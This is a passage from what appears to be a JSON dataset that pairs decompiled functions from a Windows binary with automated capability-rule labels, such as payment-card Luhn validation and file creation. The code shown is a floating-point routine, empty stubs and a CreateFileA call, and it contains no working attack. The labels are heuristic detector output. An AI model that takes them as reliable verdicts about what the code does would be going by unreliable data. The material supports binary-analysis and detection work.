auVar7, 1);\n        return in_XMM7_Qa - (dVar2 + SUB168(auVar7, 0)) * in_XMM7_Qa;\n    }\n    if (*0x401310 <= dVar2) {\n        dVar2 = dVar2 * dVar2;\n        dVar5 = dVar2 * dVar2;\n        dVar3 = dVar3 * dVar3 * dVar3 * dVar3;\n        dVar2 = (((*0x4012c0 * dVar5 + *0x4012b0) * dVar5 + *0x4012a0) * dVar5 + *0x401290) * dVar2;\n        auVar7 = CONCAT88(((*0x4012c8 * dVar3 + *0x4012b8) * dVar3 + *0x4012a8) * dVar3 + *0x401298, dVar2);\n        auVar7 = shufpd(auVar7, auVar7, 1);\n        return in_XMM7_Qa - (dVar2 + SUB168(auVar7, 0)) * in_XMM7_Qa;\n    }\n    if (dVar2 != *0x4012d8) {\n        if (*0x401320 <= dVar2) {\n            return *0x401328 * *0x401328 + param_1;\n        }\n        return *0x401328 * *0x401328 + param_1;\n    }\n    return param_1;\n}\n",
        "token_count": 1192
    },
    "00406bdc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406bdc(uint arg_8h)\n\n{\n    fcn.00406ab0(arg_8h, 0, 0);\n    return;\n}\n",
        "token_count": 41
    },
    "0040758d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004075a1)\n// WARNING: Removing unreachable block (ram,0x004075a7)\n// WARNING: Removing unreachable block (ram,0x004075a9)\n\nvoid fcn.0040758d(void)\n\n{\n    return;\n}\n",
        "token_count": 64
    },
    "00410b8c": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid fcn.00410b8c(void)\n\n{\n    *0x413024 = (*_sym.imp.KERNEL32.dll_CreateFileA)(0x403e7c, 0x40000000, 3, 0, 3, 0, 0);\n    return;\n}\n",
        "token_count": 65
    }
}